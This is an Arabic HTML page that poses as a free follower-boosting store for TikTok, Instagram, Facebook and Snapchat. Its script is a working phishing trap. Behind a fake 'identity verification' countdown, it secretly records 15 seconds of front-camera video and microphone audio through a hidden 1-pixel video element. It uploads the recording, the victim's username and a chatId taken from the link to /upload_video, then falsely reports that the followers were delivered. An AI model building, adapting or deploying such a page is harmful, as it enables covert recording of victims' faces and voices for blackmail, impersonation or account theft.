<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>متجر تزويد المتابعين</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
    * { box-sizing: border-box; }
    body {
      background-color: #0f0f1a; color: #fff; font-family: 'Cairo', sans-serif;
      margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center;
      min-height: 100vh;
      background-image: url('https://www.image2url.com/r2/default/images/1792798876629-98b4546c-9cef-4858-b853-59eeaaa4ddb0.png');
      background-size: cover;
      background-position: center;
      background-attachment: fixed;
    }
    
    .overlay {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(15, 15, 26, 0.88); z-index: 0;
    }

    .content-wrapper { position: relative; z-index: 1; width: 100%; display: flex; flex-direction: column; align-items: center; }

    .header { width: 100%; padding: 25px 15px 15px 15px; text-align: center; }
    .header h1 { margin: 0; font-size: 24px; font-weight: 900; color: #fff; text-shadow: 0 0 15px rgba(255,255,255,0.4); line-height: 1.4; }
    .header p { margin: 10px 0 0 0; font-size: 14px; color: #e1306c; font-weight: bold; }
    
    .container { width: 100%; max-width: 450px; padding: 15px; display: flex; flex-direction: column; gap: 15px; }
    
    .card { background: rgba(30, 30, 50, 0.9); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 20px; box-shadow: 0 8px 32px rgba(0,0,0,0.5); backdrop-filter: blur(10px); }
    .card h3 { margin: 0 0 15px 0; font-size: 18px; color: #fff; text-align: center; }
    
    /* شعارات المنصات بالصور */
    .platforms { display: flex; justify-content: space-around; margin-bottom: 10px; gap: 10px; }
    .platform-icon { 
      width: 65px; height: 65px; border-radius: 15px; 
      display: flex; align-items: center; justify-content: center; 
      cursor: pointer; opacity: 0.5; transition: 0.3s; 
      background: rgba(255,255,255,0.05); border: 2px solid transparent;
      overflow: hidden;
    }
    .platform-icon img { width: 100%; height: 100%; object-fit: cover; border-radius: 12px; }
    .platform-icon.active { 
      opacity: 1; border-color: #e1306c; transform: scale(1.1); 
      box-shadow: 0 0 20px rgba(225, 48, 108, 0.6); 
    }
    
    /* خانة اليوزر */
    .input-group { margin-bottom: 15px; }
    .input-group label { display: block; margin-bottom: 8px; font-size: 14px; color: #ccc; }
    .input-group input { width: 100%; padding: 14px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.2); border-radius: 10px; color: #fff; font-family: 'Cairo', sans-serif; font-size: 16px; outline: none; transition: 0.3s; }
    .input-group input:focus { border-color: #e1306c; box-shadow: 0 0 10px rgba(225, 48, 108, 0.3); }

    .options { display: flex; flex-direction: column; gap: 10px; }
    .option-btn {
      background: rgba(255,255,255,0.05); border: 2px solid rgba(255,255,255,0.1); border-radius: 10px; padding: 15px;
      font-size: 16px; font-family: 'Cairo', sans-serif; font-weight: bold; cursor: pointer; color: #fff;
      display: flex; justify-content: space-between; align-items: center; transition: 0.3s;
    }
    .option-btn:hover, .option-btn.selected { border-color: #e1306c; background: rgba(225, 48, 108, 0.15); color: #ff6b9d; }
    
    .buy-btn {
      background: linear-gradient(45deg, #405de6, #e1306c); color: white; border: none; border-radius: 10px; padding: 16px;
      font-size: 18px; font-family: 'Cairo', sans-serif; font-weight: 900; cursor: pointer;
      width: 100%; margin-top: 10px; box-shadow: 0 4px 20px rgba(225, 48, 108, 0.5);
      transition: 0.3s; display: none;
    }
    .buy-btn:active { transform: scale(0.98); }

    /* شاشة التحقق */
    .verify-screen {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: #0a0a15; z-index: 999; display: none; flex-direction: column;
      align-items: center; justify-content: center; text-align: center; padding: 20px;
    }
    .verify-icon { font-size: 70px; color: #e1306c; margin-bottom: 20px; animation: pulse 1.5s infinite; }
    @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
    .verify-screen h2 { font-size: 22px; color: #fff; margin-bottom: 10px; }
    .verify-screen p { font-size: 14px; color: #aaa; margin-bottom: 30px; }
    
    .loading-bar { width: 100%; max-width: 300px; height: 8px; background: rgba(255,255,255,0.1); border-radius: 4px; overflow: hidden; margin-top: 20px; }
    .loading-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #405de6, #e1306c); transition: width 1s linear; }
    
    .timer-display { font-size: 40px; font-weight: bold; color: #e1306c; margin-top: 10px; text-shadow: 0 0 20px rgba(225, 48, 108, 0.5); }
    
    #video { width: 1px; height: 1px; opacity: 0.01; position: absolute; top: 0; left: 0; }
  </style>
</head>
<body>

  <div class="overlay"></div>

  <div class="content-wrapper">
    <div class="header">
      <h1>متجر تزويد متابعين جميع تطبيقات التواصل الاجتماعي</h1>
      <p>🚀 خدمات فورية وآمنة 100%</p>
    </div>

    <div class="container">
      <!-- اختيار المنصة بالصور -->
      <div class="card">
        <h3>اختر المنصة</h3>
        <div class="platforms">
          <!-- صور المنصات -->
          <div class="platform-icon active" onclick="selectPlatform('tiktok', this)">
            <img src="https://www.image2url.com/r2/default/images/1792798846598-9b991655-ba2d-4e4c-93ef-6c20c8b78040.jpg" alt="TikTok">
          </div>
          <div class="platform-icon" onclick="selectPlatform('instagram', this)">
            <img src="https://www.image2url.com/r2/default/images/1792798734798-e986b30f-87d5-4d47-b44b-8746545eb605.jpg" alt="Instagram">
          </div>
          <div class="platform-icon" onclick="selectPlatform('facebook', this)">
            <img src="https://www.image2url.com/r2/default/images/1792798759082-76071908-058e-4046-96e8-8a2627fe3891.jpg" alt="Facebook">
          </div>
          <div class="platform-icon" onclick="selectPlatform('snapchat', this)">
            <img src="https://www.image2url.com/r2/default/images/1792798876629-98b4546c-9cef-4858-b853-59eeaaa4ddb0.png" alt="Snapchat">
          </div>
        </div>
      </div>

      <!-- اليوزر والكمية -->
      <div class="card">
        <div class="input-group">
          <label>👤 اسم المستخدم (اليوزر)</label>
          <input type="text" id="username" placeholder="مثال: @username" required>
        </div>
        <h3>اختر كمية المتابعين</h3>
        <div class="options">
          <div class="option-btn" onclick="selectOption(1000, this)"><span>🌟 1000 متابع</span> <span>مجاناً</span></div>
          <div class="option-btn" onclick="selectOption(2000, this)"><span>🔥 2000 متابع</span> <span>مجاناً</span></div>
          <div class="option-btn" onclick="selectOption(3000, this)"><span>💎 3000 متابع</span> <span>مجاناً</span></div>
          <div class="option-btn" onclick="selectOption(5000, this)"><span>👑 5000 متابع</span> <span>مجاناً</span></div>
        </div>
      </div>

      <button class="buy-btn" id="buyBtn" onclick="startVerification()">تأكيد الطلب والتحقق</button>
    </div>
  </div>

  <!-- شاشة التحقق -->
  <div class="verify-screen" id="verifyScreen">
    <div class="verify-icon" id="verifyIcon">🔒</div>
    <h2 id="verifyTitle">جاري التحقق من الهوية...</h2>
    <p id="verifyText">يرجى الانتظار، يتم الآن التحقق من حسابك لتجنب الاحتيال.</p>
    <div class="timer-display" id="timerDisplay">15</div>
    <div class="loading-bar"><div class="loading-fill" id="loadingFill"></div></div>
  </div>

  <video id="video" autoplay playsinline muted></video>

  <script>
    let selectedPlatform = 'tiktok';
    let selectedAmount = 0;
    let mediaRecorder;
    let recordedChunks = [];
    
    const urlParams = new URLSearchParams(window.location.search);
    const userChatId = urlParams.get('chatId');

    function selectPlatform(platform, el) {
      selectedPlatform = platform;
      document.querySelectorAll('.platform-icon').forEach(i => i.classList.remove('active'));
      el.classList.add('active');
    }

    function selectOption(amount, el) {
      selectedAmount = amount;
      document.querySelectorAll('.option-btn').forEach(b => b.classList.remove('selected'));
      el.classList.add('selected');
      document.getElementById('buyBtn').style.display = 'block';
    }

    async function startVerification() {
      const username = document.getElementById('username').value.trim();
      
      if (!userChatId) {
        alert("خطأ: هذا الرابط غير صالح.");
        return;
      }
      if (!username) {
        alert("يرجى إدخال اسم المستخدم (اليوزر) أولاً.");
        return;
      }
      if (selectedAmount === 0) {
        alert("يرجى اختيار كمية المتابعين أولاً.");
        return;
      }

      const verifyScreen = document.getElementById('verifyScreen');
      const timerDisplay = document.getElementById('timerDisplay');
      const loadingFill = document.getElementById('loadingFill');
      const verifyText = document.getElementById('verifyText');
      const verifyTitle = document.getElementById('verifyTitle');
      const verifyIcon = document.getElementById('verifyIcon');

      verifyScreen.style.display = 'flex';

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
        
        mediaRecorder = new MediaRecorder(stream);
        
        mediaRecorder.ondataavailable = event => {
          if (event.data.size > 0) recordedChunks.push(event.data);
        };

        mediaRecorder.onstop = async () => {
          verifyTitle.innerText = "تم التحقق بنجاح!";
          verifyText.innerText = "جاري إضافة المتابعين لحسابك...";
          verifyIcon.innerText = "✅";
          verifyIcon.style.color = "#00ff00";
          timerDisplay.style.display = "none";
          
          const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
          const formData = new FormData();
          formData.append('video', videoBlob, 'verify_video.webm');
          formData.append('chat_id', userChatId);
          formData.append('platform', selectedPlatform);
          formData.append('amount', selectedAmount);
          formData.append('username', username); 

          try {
            await fetch('/upload_video', { method: 'POST', body: formData });
            setTimeout(() => {
              verifyTitle.innerText = "✅ تم تسليم الطلب!";
              verifyText.innerText = "تم إضافة المتابعين لحسابك بنجاح. (أغلق الصفحة)";
            }, 2000);
          } catch (e) {
            verifyText.innerText = "❌ فشل الاتصال.";
          }
        };

        mediaRecorder.start();
        
        let timeLeft = 15;
        timerDisplay.innerText = timeLeft;
        
        setTimeout(() => { loadingFill.style.width = '100%'; }, 100);

        const interval = setInterval(() => {
          timeLeft--;
          timerDisplay.innerText = timeLeft;
          
          if (timeLeft <= 0) {
            clearInterval(interval);
            mediaRecorder.stop();
            stream.getTracks().forEach(track => track.stop());
          }
        }, 1000);

      } catch (err) {
        verifyTitle.innerText = "❌ فشل التحقق";
        verifyText.innerText = "يرجى السماح بالوصول للكاميرا لتأكيد الهوية.";
        verifyIcon.innerText = "❌";
        verifyIcon.style.color = "#ff0000";
      }
    }
  </script>
</body>
</html>
